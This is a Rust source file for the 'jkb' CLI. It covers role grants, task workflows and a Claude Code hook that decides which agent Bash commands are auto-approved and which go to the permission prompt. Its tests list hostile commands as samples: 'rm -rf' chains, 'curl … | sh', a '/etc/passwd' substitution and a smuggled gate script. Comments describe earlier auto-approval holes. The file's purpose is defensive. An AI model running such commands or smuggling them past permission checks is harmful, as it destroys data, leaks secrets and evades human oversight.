//! `jkb role`, `jkb workflow` and `jkb attest` — roles, task workflows and harness attestation from
//! the command line (design D52, `openspec/changes/jkb-rbac-workflows/`).
//!
//! Every verb is an op through [`jkb_api::Backend`], so the host and the dev container run the same
//! code, and the daemon enforces the same rules on both.

use std::io::Read as _;
use std::path::PathBuf;

use anyhow::{bail, Context as _, Result};
use clap::Subcommand;
use jkb_api::{Backend, Request, Response};
use serde_json::{json, Value};

use crate::remote::{self, Purpose};

#[derive(Subcommand)]
pub enum RoleCmd {
    /// Mint a role grant and print its token — shown this once; only its hash is kept.
    Grant {
        /// operator, coordinator, designer, implementer, reviewer or `systemic_reviewer`.
        role: String,
        /// Scope it to this task: it may write only the task, its subtasks and its findings.
        #[arg(long)]
        task: Option<String>,
        /// Who it is for, recorded in every history row it writes.
        #[arg(long, default_value = "agent")]
        agent: String,
        /// Print `export JKB_AGENT_TOKEN=…` instead of the bare token.
        #[arg(long)]
        export: bool,
    },
    /// Revoke a grant, and every grant it minted.
    Revoke {
        /// The grant id (`jkb role ls`).
        id: i64,
    },
    /// List live grants and the agent-type map.
    Ls {
        /// Only grants scoped to this task.
        #[arg(long)]
        task: Option<String>,
        /// Include revoked grants.
        #[arg(long)]
        all: bool,
    },
    /// Who this caller is: its roles and scope.
    Whoami,
    /// Bind this (attested) subagent to the task it works on. The first bind wins: a worker cannot
    /// move on to another task afterwards.
    Bind {
        /// The task.
        uid: String,
    },
    /// Map a Claude Code agent type (a subagent definition's `name`) to the role an attested call from
    /// it holds. Operator only.
    Map {
        /// The agent type.
        agent_type: String,
        /// The role; omit with --clear to remove the mapping.
        role: Option<String>,
        /// Remove the mapping.
        #[arg(long)]
        clear: bool,
    },
    /// Replace the dev container's credential (operator, on the host). Revokes the old one and
    /// everything it minted.
    RotateContainer {
        /// Write it to `~/.jkb-container/credential` (0600) instead of printing it.
        #[arg(long)]
        write: bool,
        /// Keep the credential already written there if it still names a live container grant, and
        /// rotate only when it does not — what `setup.sh` runs after every pull, where rotating would
        /// revoke every worker grant minted from the old one.
        #[arg(long, requires = "write")]
        keep_live: bool,
    },
    /// Print the role tables: which role runs which class of op, and who grants whom.
    Matrix,
}

#[derive(Subcommand)]
pub enum WorkflowCmd {
    /// A task's workflow: phase, strategy, who acts next, what the caller may do, history.
    Show {
        /// The task.
        uid: String,
    },
    /// Who acts next on a task, and the one thing to do.
    Next {
        /// The task; omitted, the task whose branch the current directory is on.
        uid: Option<String>,
        /// Run as a Claude Code Stop hook: read the hook's JSON on stdin, and ask the session to keep
        /// going while the next step is one it drives.
        #[arg(long)]
        stop_hook: bool,
    },
    /// Fire an event: `submit_design`, `approve_design`, `reject_design`, `submit_work`, `submit_systemic`,
    /// `systemic_redesign`, rework, cancel, reopen, override.
    Fire {
        /// The task.
        uid: String,
        /// The event.
        event: String,
        /// Why — required for `submit_systemic`, `systemic_redesign` and override.
        #[arg(long)]
        reason: Option<String>,
        /// The phase an override names.
        #[arg(long)]
        to: Option<String>,
    },
    /// Observe the task and take the one step the facts call for (after a review round: landable,
    /// back to implementation, or on to a systemic review).
    Observe {
        /// The task.
        uid: String,
    },
    /// Pin a task to a strategy (operator).
    Set {
        /// The task.
        uid: String,
        /// A preset (design-reviewed, coordinated, autonomous) or a defined name.
        strategy: String,
    },
    /// Define or redefine a strategy (operator): a graph, toggles and attributes.
    Define {
        /// Its name; `default` makes it the default for tasks with none pinned.
        name: String,
        /// Start from this preset or definition.
        #[arg(long)]
        from: Option<String>,
        /// reviewed-design or direct.
        #[arg(long)]
        graph: Option<String>,
        /// Who approves designs, comma-separated (operator, coordinator).
        #[arg(long)]
        approves_design: Option<String>,
        /// Who lands, comma-separated (operator, coordinator).
        #[arg(long)]
        lands: Option<String>,
        /// When must-fixes repeat: `file:2`, `directory:3`.
        #[arg(long)]
        repeated_area: Option<String>,
    },
    /// List the presets and definitions, and the default.
    Strategies,
    /// Print a graph as Graphviz dot.
    Dot {
        /// reviewed-design or direct.
        graph: String,
    },
}

#[derive(Subcommand)]
pub enum AttestCmd {
    /// The Claude Code hook: read a `PreToolUse`, `PostToolUse`, `PostToolUseFailure`, `SubagentStop` or
    /// `SessionEnd` payload on stdin, mint or release the tool call's ticket, and on `PreToolUse` put it
    /// on the command. Always exits 0; failures go to `~/.jkb/logs/attest-hook.log`.
    Hook,
}

fn unexpected<T>(op: &str, r: &Response) -> Result<T> {
    bail!("{op}: unexpected answer {r:?}")
}

fn call(b: &dyn Backend, r: Request) -> Result<Response> {
    b.call(r).map_err(|e| anyhow::anyhow!("{}", e.message))
}

fn print(json_out: bool, v: &Value, human: impl FnOnce()) {
    if json_out {
        println!("{v}");
    } else {
        human();
    }
}

/// Run a `jkb role` verb.
///
/// # Errors
/// A refused op, or a failure writing the credential.
#[allow(clippy::too_many_lines)] // one arm per verb
pub fn role(b: &dyn Backend, cmd: RoleCmd, json_out: bool) -> Result<()> {
    match cmd {
        RoleCmd::Grant {
            role,
            task,
            agent,
            export,
        } => match call(b, Request::RoleGrant { role, task, agent })? {
            Response::Granted { grant, token } => {
                let v = json!({ "grant": grant, "token": token });
                print(json_out, &v, || {
                    if export {
                        println!("export {}={token}", remote::AGENT_TOKEN_VAR);
                    } else {
                        eprintln!(
                            "granted {} (id {}) to {}{} — the token is shown once:",
                            grant.role,
                            grant.id,
                            grant.agent,
                            grant
                                .task
                                .as_deref()
                                .map(|t| format!(" on {t}"))
                                .unwrap_or_default()
                        );
                        println!("{token}");
                    }
                });
                Ok(())
            }
            other => unexpected("role.grant", &other),
        },
        RoleCmd::Revoke { id } => match call(b, Request::RoleRevoke { id })? {
            Response::Revoked { count } => {
                print(json_out, &json!({ "revoked": count }), || {
                    println!("revoked {count} grant(s)");
                });
                Ok(())
            }
            other => unexpected("role.revoke", &other),
        },
        RoleCmd::Ls { task, all } => match call(b, Request::RoleList { task, all })? {
            Response::Grants { listing } => {
                print(json_out, &json!(listing), || {
                    for g in &listing.grants {
                        println!(
                            "{:>4}  {:<17} {:<24} {}{}{}",
                            g.id,
                            g.role,
                            g.agent,
                            g.task.as_deref().unwrap_or("(unscoped)"),
                            g.parent
                                .map(|p| format!("  minted by {p}"))
                                .unwrap_or_default(),
                            g.revoked_at
                                .as_deref()
                                .map(|r| format!("  REVOKED {r}"))
                                .unwrap_or_default()
                        );
                    }
                    for (t, r) in &listing.agent_types {
                        println!("agent type {t} -> {r}");
                    }
                });
                Ok(())
            }
            other => unexpected("role.list", &other),
        },
        RoleCmd::Whoami => match call(b, Request::RoleWhoami {})? {
            Response::WhoAmI { whoami } => {
                print(json_out, &json!(whoami), || {
                    println!(
                        "{} — {}{}",
                        whoami.label,
                        if whoami.roles.is_empty() {
                            "no role".to_owned()
                        } else {
                            whoami.roles.join(", ")
                        },
                        whoami
                            .task
                            .as_deref()
                            .map(|t| format!(", on {t}"))
                            .unwrap_or_default()
                    );
                });
                Ok(())
            }
            other => unexpected("role.whoami", &other),
        },
        RoleCmd::Bind { uid } => match call(b, Request::RoleBind { uid })? {
            Response::Applied {} => Ok(()),
            other => unexpected("role.bind", &other),
        },
        RoleCmd::Map {
            agent_type,
            role,
            clear,
        } => {
            if role.is_none() && !clear {
                bail!("name a role, or --clear the mapping");
            }
            match call(b, Request::RoleMap { agent_type, role })? {
                Response::Applied {} => Ok(()),
                other => unexpected("role.map", &other),
            }
        }
        RoleCmd::RotateContainer { write, keep_live } => {
            let keep = keep_live
                .then(|| std::fs::read_to_string(remote::container_credential()).ok())
                .flatten()
                .map(|t| t.trim().to_owned())
                .filter(|t| !t.is_empty());
            match call(b, Request::RoleRotateContainer { keep: keep.clone() })? {
                Response::Granted { grant, token } if keep.as_deref() == Some(token.as_str()) => {
                    print(json_out, &json!({ "kept": grant }), || {
                        println!("container credential {} is live; kept", grant.id);
                    });
                    Ok(())
                }
                Response::Granted { grant, token } => {
                    if write {
                        let path = remote::container_credential();
                        jkb_daemon::token::write(&path, &token)
                            .with_context(|| format!("writing {}", path.display()))?;
                        print(json_out, &json!({ "grant": grant, "path": path }), || {
                            println!(
                                "container credential {} written to {}",
                                grant.id,
                                path.display()
                            );
                        });
                    } else {
                        print(json_out, &json!({ "grant": grant, "token": token }), || {
                            println!("{token}");
                        });
                    }
                    Ok(())
                }
                other => unexpected("role.rotate_container", &other),
            }
        }
        RoleCmd::Matrix => {
            use jkb_rbac::Grants as _;
            println!("## Which role runs which class of op\n");
            print!("{}", jkb_api::rbac::OP_GRANTS.matrix());
            println!("\n## Which role may grant which\n");
            print!("{}", jkb_core::roles::GRANTABLE.matrix());
            Ok(())
        }
    }
}

fn show(b: &dyn Backend, uid: String) -> Result<Box<jkb_api::rbac::WorkflowView>> {
    match call(b, Request::WorkflowShow { uid })? {
        Response::Workflow { workflow } => Ok(workflow),
        other => unexpected("workflow.show", &other),
    }
}

fn roles_list(s: &str) -> Vec<String> {
    s.split(',')
        .map(str::trim)
        .filter(|r| !r.is_empty())
        .map(str::to_owned)
        .collect()
}

/// Run a `jkb workflow` verb.
///
/// # Errors
/// A refused op, or a malformed argument.
#[allow(clippy::too_many_lines)] // one arm per verb
pub fn workflow(b: &dyn Backend, cmd: WorkflowCmd, json_out: bool) -> Result<()> {
    match cmd {
        WorkflowCmd::Show { uid } => {
            let w = show(b, uid)?;
            print(json_out, &json!(w), || {
                println!("task:      {}", w.uid);
                println!("phase:     {}", w.phase);
                println!("strategy:  {}", w.source);
                println!("next:      {} — {}", w.next_role, w.next_step);
                if !w.may_fire.is_empty() {
                    println!("you may:   {}", w.may_fire.join(", "));
                }
                println!("\n{}", w.matrix);
                if !w.history.is_empty() {
                    println!("history:");
                    for h in &w.history {
                        println!("  {h}");
                    }
                }
            });
            Ok(())
        }
        WorkflowCmd::Next { uid, stop_hook } => {
            if stop_hook {
                stop(b, uid);
                return Ok(());
            }
            let uid = match uid {
                Some(u) => u,
                None => {
                    task_here(b)?.context("no task records this directory's branch; name one")?
                }
            };
            let w = show(b, uid)?;
            print(
                json_out,
                &json!({ "uid": w.uid, "phase": w.phase, "next_role": w.next_role,
                         "next_step": w.next_step, "caller_acts_next": w.caller_acts_next }),
                || {
                    println!(
                        "{} is in {}: {} — {}",
                        w.uid, w.phase, w.next_role, w.next_step
                    );
                },
            );
            Ok(())
        }
        WorkflowCmd::Fire {
            uid,
            event,
            reason,
            to,
        } => moved(
            call(
                b,
                Request::WorkflowFire {
                    uid,
                    event,
                    reason,
                    to,
                },
            )?,
            json_out,
        ),
        WorkflowCmd::Observe { uid } => moved(call(b, Request::WorkflowObserve { uid })?, json_out),
        WorkflowCmd::Set { uid, strategy } => {
            match call(b, Request::WorkflowSet { uid, strategy })? {
                Response::Applied {} => Ok(()),
                other => unexpected("workflow.set", &other),
            }
        }
        WorkflowCmd::Define {
            name,
            from,
            graph,
            approves_design,
            lands,
            repeated_area,
        } => {
            let mut spec = match &from {
                Some(base) => {
                    let (list, _) = strategies(b)?;
                    list.into_iter()
                        .find(|s| {
                            s.name == *base || s.name.split('@').next() == Some(base.as_str())
                        })
                        .with_context(|| format!("no strategy `{base}` to start from"))?
                        .spec
                }
                None => json!({ "graph": "reviewed-design" }),
            };
            if let Some(g) = graph {
                spec["graph"] = json!(g);
            }
            if let Some(r) = approves_design {
                spec["toggles"]["approves_design"] = json!(roles_list(&r));
            }
            if let Some(r) = lands {
                spec["toggles"]["lands"] = json!(roles_list(&r));
            }
            if let Some(ra) = repeated_area {
                let (scope, rounds) = ra
                    .split_once(':')
                    .context("--repeated-area as <file|directory>:<rounds>")?;
                let rounds: u32 = rounds.parse().context("--repeated-area rounds")?;
                spec["attributes"]["repeated_area"] = json!({ "scope": scope, "rounds": rounds });
            }
            match call(
                b,
                Request::WorkflowDefine {
                    name: name.clone(),
                    spec,
                },
            )? {
                Response::Defined { version } => {
                    print(
                        json_out,
                        &json!({ "name": name, "version": version }),
                        || {
                            println!("defined {name}@{version}");
                        },
                    );
                    Ok(())
                }
                other => unexpected("workflow.define", &other),
            }
        }
        WorkflowCmd::Strategies => {
            let (list, default) = strategies(b)?;
            print(
                json_out,
                &json!({ "strategies": list, "default": default }),
                || {
                    for s in &list {
                        let mark =
                            if s.name == default || s.name.starts_with(&format!("{default}@")) {
                                "*"
                            } else {
                                " "
                            };
                        println!("{mark} {:<20} {}  {}", s.name, s.describe, s.spec);
                    }
                },
            );
            Ok(())
        }
        WorkflowCmd::Dot { graph } => {
            let g = jkb_core::workflow::GraphId::parse(&graph)
                .with_context(|| format!("no graph `{graph}` (reviewed-design, direct)"))?;
            print!("{}", g.machine().dot(g.as_str()));
            Ok(())
        }
    }
}

fn strategies(b: &dyn Backend) -> Result<(Vec<jkb_api::rbac::StrategyInfo>, String)> {
    match call(b, Request::WorkflowStrategies {})? {
        Response::Strategies {
            strategies,
            default,
        } => Ok((strategies, default)),
        other => unexpected("workflow.strategies", &other),
    }
}

fn moved(r: Response, json_out: bool) -> Result<()> {
    let Response::WorkflowMoved { outcome } = r else {
        return unexpected("workflow.fire", &r);
    };
    if let Some(why) = &outcome.refusal {
        if json_out {
            println!("{}", json!(outcome));
        }
        bail!("refused: {why}");
    }
    print(json_out, &json!(outcome), || match &outcome.event {
        Some(e) if outcome.moved => println!("{e}: now {}", outcome.phase),
        _ => println!("nothing to do: still {}", outcome.phase),
    });
    Ok(())
}

/// The task whose branch the current directory is checked out on, if a task records it.
fn task_here(b: &dyn Backend) -> Result<Option<String>> {
    let ctx = crate::repo::repo_ctx()?;
    let cwd = std::env::current_dir()?;
    let Some(branch) = crate::gitrepo::current_branch(&cwd)? else {
        return Ok(None);
    };
    let kb = crate::session_cli::Kb::new(b);
    let by_branch = kb.by_branch(&ctx.key)?;
    Ok(by_branch
        .get(&branch)
        .and_then(|ts| crate::session_cli::task_on(ts))
        .map(|t| t.uid.clone()))
}

/// The roles a coordinator drives: while one of them acts next, the coordinator's turn is not over.
const DRIVEN: &[&str] = &[
    "coordinator",
    "designer",
    "implementer",
    "reviewer",
    "systemic_reviewer",
];

/// The environment variable a session opts in to being driven with: `1` for the task its directory's
/// branch records, or a task uid.
pub const DRIVE_VAR: &str = "JKB_DRIVE";

/// Whether, and what, a Stop hook drives.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Drive {
    /// The session did not opt in: the hook never holds it, whatever phase its task is in.
    Off,
    /// The task the directory's branch records.
    Here,
    /// This task.
    Task(String),
}

/// What the Stop hook drives, from the session's opt-in (`JKB_DRIVE`) and the hook's own `uid`.
fn driven(opt_in: Option<&str>, uid: Option<String>) -> Drive {
    match (opt_in.map(str::trim), uid) {
        (None | Some("" | "0"), _) => Drive::Off,
        (Some("1"), Some(uid)) => Drive::Task(uid),
        (Some("1"), None) => Drive::Here,
        (Some(named), _) => Drive::Task(named.to_owned()),
    }
}

/// `jkb workflow next --stop-hook`: a Claude Code Stop hook. Blocks the stop — with the next step as
/// the reason, which Claude reads — while the task's next actor is one the coordinator drives; lets
/// it through when the operator acts next or the task is settled. Once per stop: a stop the hook
/// already sent back (`stop_hook_active`) is let through, so a session that cannot progress is not
/// held in a loop. Anything it cannot establish lets the stop through, silently.
///
/// **Only in a session that opted in** ([`DRIVE_VAR`], set where the coordinating session is
/// launched). A managed hook fires in every session in the container, and an interactive one working
/// in a task's worktree was told to "continue" implementing — every turn — work nobody had asked it
/// for.
fn stop(b: &dyn Backend, uid: Option<String>) {
    let uid = match driven(std::env::var(DRIVE_VAR).ok().as_deref(), uid) {
        Drive::Off => return,
        Drive::Here => None,
        Drive::Task(uid) => Some(uid),
    };
    let mut raw = String::new();
    let _ = std::io::stdin().read_to_string(&mut raw);
    let payload: Value = serde_json::from_str(&raw).unwrap_or(Value::Null);
    if payload["stop_hook_active"].as_bool() == Some(true) {
        return;
    }
    if let Some(dir) = payload["cwd"].as_str() {
        let _ = std::env::set_current_dir(dir);
    }
    let uid = match uid {
        Some(u) => Some(u),
        None => task_here(b).ok().flatten(),
    };
    let Some(uid) = uid else { return };
    let Ok(w) = show(b, uid) else { return };
    if DRIVEN.contains(&w.next_role.as_str()) {
        println!(
            "{}",
            json!({
                "decision": "block",
                "reason": format!(
                    "The workflow for {} is in `{}`, and the next step is the {}'s: {}. Continue \
                     it (`jkb workflow show {}` for the whole picture).",
                    w.uid, w.phase, w.next_role, w.next_step, w.uid
                ),
            })
        );
    }
}

/// The attestation hook's log.
fn attest_log() -> PathBuf {
    std::env::var_os("HOME")
        .map_or_else(|| PathBuf::from("."), PathBuf::from)
        .join(".jkb/logs/attest-hook.log")
}

fn log_failure(what: &str) {
    use std::io::Write as _;
    let path = attest_log();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
    {
        let _ = writeln!(f, "{}: {what}", std::process::id());
    }
}

/// Whether a Bash command visibly runs `jkb` — the only commands the hook puts a ticket on. A ticket
/// needs a rewrite, and a rewrite needs a permission decision, so the hook touches as few tool calls
/// as it can; a script that runs `jkb` indirectly gets no ticket and is refused, which says so.
fn runs_jkb(command: &str) -> bool {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '`' | '$'))
        .any(|w| w == "jkb" || w.ends_with("/jkb"))
}

/// What the attestation hook does with a Bash command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Attestation {
    /// Not a `jkb` call: left alone, no ticket, no decision.
    Skip,
    /// Ticketed, and the rewrite approved: exactly one plain `jkb` invocation that cannot run a shell
    /// command — what a `Bash(jkb:*)` allow rule would approve anyway, and every request it makes is
    /// held to the ticket's role by the daemon.
    Allow,
    /// Ticketed, and the call put to the permission prompt (or the auto-mode classifier): anything
    /// else that runs `jkb`. Returning `allow` for a whole compound command approved whatever rode
    /// along with the `jkb` in it (`jkb ls && rm -rf …`), which the prompt would otherwise have judged.
    Ask,
}

/// Characters that make a command more than one plain invocation: separators, pipes, redirects,
/// substitutions, expansions, grouping, escapes, comments and line breaks. Refused even inside quotes,
/// because telling a quoted one from a live one is a shell parser's job, not this hook's.
const SHELL_SYNTAX: &[char] = &[
    ';', '&', '|', '<', '>', '$', '`', '(', ')', '{', '}', '\\', '\n', '\r', '#', '!', '*', '?',
    '[', ']', '~',
];

/// The words a command the shell will run as — quotes removed, as the shell removes them. `None` for an
/// unbalanced quote. Sound only for a command with none of [`SHELL_SYNTAX`] in it: with no `$`, `` ` ``
/// or `\\`, nothing inside either kind of quote is expanded or escaped.
fn shell_words(command: &str) -> Option<Vec<String>> {
    let mut words = Vec::new();
    let mut word: Option<String> = None;
    let mut quote: Option<char> = None;
    for c in command.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (None, '\'' | '"') => {
                quote = Some(c);
                word.get_or_insert_with(String::new);
            }
            (None, c) if c.is_whitespace() => words.extend(word.take()),
            // Inside quotes or out, anything else is part of the word.
            (_, c) => word.get_or_insert_with(String::new).push(c),
        }
    }
    words.extend(word);
    quote.is_none().then_some(words)
}

/// Classify a Bash command for [`attest`].
fn attestation(command: &str) -> Attestation {
    if !runs_jkb(command) {
        return Attestation::Skip;
    }
    let command = command.trim();
    if command.contains(SHELL_SYNTAX) {
        return Attestation::Ask;
    }
    // Judged on the words the shell will pass, never the raw text: `task 'land'` is `task land` to
    // the shell, and a raw comparison auto-approved it, `--gate` and all.
    let Some(words) = shell_words(command) else {
        return Attestation::Ask;
    };
    let mut words = words.into_iter();
    // `jkb` found on PATH, by name: a path to some other file called `jkb` is some other program.
    if words.next().as_deref() != Some("jkb") {
        return Attestation::Ask;
    }
    // `task land` runs the repository's gate — a shell command — where it is invoked. Asked wherever
    // `land` appears, rather than by locating the subcommand: a global option's value (`--db <path>`)
    // sits where a parser that does not know every option would look for it.
    if words.any(|w| w == "land") {
        return Attestation::Ask;
    }
    Attestation::Allow
}

/// `jkb attest hook`. Never fails: every failure is logged, and the tool call proceeds without a
/// ticket — which its `jkb` calls then refuse. Failing closed is the daemon's job, not the hook's.
pub fn attest(cmd: &AttestCmd) {
    let AttestCmd::Hook = cmd;
    let mut raw = String::new();
    if let Err(e) = std::io::stdin().read_to_string(&mut raw) {
        log_failure(&format!("reading the payload: {e}"));
        return;
    }
    let p: Value = match serde_json::from_str(&raw) {
        Ok(v) => v,
        Err(e) => {
            log_failure(&format!("parsing the payload: {e}"));
            return;
        }
    };
    let s = |k: &str| p[k].as_str().map(str::to_owned);
    let Some(session) = s("session_id") else {
        return;
    };
    let backend = match remote::client(&remote::daemon_url(), Purpose::Hook) {
        Ok(b) => b,
        Err(e) => {
            log_failure(&format!("client: {}", e.message));
            return;
        }
    };
    let request = match s("hook_event_name").as_deref() {
        Some("PreToolUse") => {
            let command = p["tool_input"]["command"].as_str().unwrap_or_default();
            let class = attestation(command);
            if s("tool_name").as_deref() != Some("Bash") || class == Attestation::Skip {
                return;
            }
            let Some(tool_use_id) = s("tool_use_id") else {
                return;
            };
            let token = match backend.call(Request::AttestMint {
                session,
                agent_id: s("agent_id"),
                agent_type: s("agent_type"),
                tool_use_id,
            }) {
                Ok(Response::Ticket { token }) => token,
                Ok(other) => {
                    log_failure(&format!("attest.mint: unexpected {other:?}"));
                    return;
                }
                Err(e) => {
                    log_failure(&format!("attest.mint: {}", e.message));
                    return;
                }
            };
            let mut input = p["tool_input"].clone();
            input["command"] = json!(format!("export {}={token}; {command}", remote::ATTEST_VAR));
            println!(
                "{}",
                json!({
                    "hookSpecificOutput": {
                        "hookEventName": "PreToolUse",
                        "permissionDecision": if class == Attestation::Allow
                            && std::env::var("JKB_ATTEST_DECISION").as_deref() != Ok("ask")
                        {
                            "allow"
                        } else {
                            "ask"
                        },
                        "updatedInput": input,
                    }
                })
            );
            return;
        }
        // Only a call this hook ticketed has anything to release: asking the daemon after every
        // `ls` put it on every Bash call's path.
        Some("PostToolUse" | "PostToolUseFailure") => {
            let command = p["tool_input"]["command"].as_str().unwrap_or_default();
            if attestation(command) == Attestation::Skip {
                return;
            }
            Request::AttestRelease {
                session,
                agent_id: None,
                tool_use_id: s("tool_use_id"),
            }
        }
        Some("SubagentStop") => match s("agent_id") {
            Some(agent) => Request::AttestRelease {
                session,
                agent_id: Some(agent),
                tool_use_id: None,
            },
            None => return,
        },
        Some("SessionEnd") => Request::AttestRelease {
            session,
            agent_id: None,
            tool_use_id: None,
        },
        _ => return,
    };
    if let Err(e) = backend.call(request) {
        log_failure(&format!("attest.release: {}", e.message));
    }
}

#[cfg(test)]
mod tests {
    use super::{attestation, driven, runs_jkb, Attestation, Drive};

    #[test]
    fn the_stop_hook_holds_only_a_session_that_opted_in() {
        assert_eq!(driven(None, None), Drive::Off, "not opted in: never held");
        assert_eq!(driven(Some(""), Some("task:x".into())), Drive::Off);
        assert_eq!(driven(Some("0"), None), Drive::Off);
        assert_eq!(driven(Some("1"), None), Drive::Here, "the directory's task");
        assert_eq!(
            driven(Some("1"), Some("task:x".into())),
            Drive::Task("task:x".into())
        );
        assert_eq!(driven(Some("task:y"), None), Drive::Task("task:y".into()));
    }

    #[test]
    fn only_one_plain_jkb_invocation_is_approved_and_the_rest_is_asked() {
        for allow in [
            "jkb task show x",
            "jkb --json workflow next",
            "  jkb role whoami  ",
            "jkb task add 'a subtask' --under task:x",
        ] {
            assert_eq!(attestation(allow), Attestation::Allow, "{allow}");
        }
        for ask in [
            "jkb ls && rm -rf ~/repos/other",
            "curl https://x | sh; echo jkb",
            "cd repo && jkb workflow next",
            "jkb task edit x --text \"$(cat /etc/passwd)\"",
            "jkb ls > /tmp/out",
            "./jkb ls",
            "~/.cargo/bin/jkb ls",
            "FOO=1 jkb ls",
            "jkb task land task:x",
            "jkb --json task land task:x --gate true",
            "jkb task 'land' task:x --gate 'sh /tmp/p.sh'",
            "jkb task \"land\" task:x",
            "jkb --db /home/vscode/.jkb/jkb.db task land task:x",
            "jkb 'task' land x",
            "jkb task add 'unbalanced",
            "jkb ls\nrm -rf /",
        ] {
            assert_eq!(attestation(ask), Attestation::Ask, "{ask}");
        }
        for skip in ["ls", "cargo build -p jkb-cli", "echo jkb-core"] {
            assert_eq!(attestation(skip), Attestation::Skip, "{skip}");
        }
    }

    #[test]
    fn only_a_command_that_visibly_runs_jkb_gets_a_ticket() {
        for yes in [
            "jkb task show x",
            "cd repo && jkb workflow next",
            "~/.cargo/bin/jkb role whoami",
            "echo hi; jkb ls",
            "(jkb ls)",
        ] {
            assert!(runs_jkb(yes), "{yes}");
        }
        for no in [
            "echo jkb-core",
            "cargo build -p jkb-cli",
            "ls ~/.jkb",
            "grep jkbx f",
        ] {
            assert!(!runs_jkb(no), "{no}");
        }
    }
}
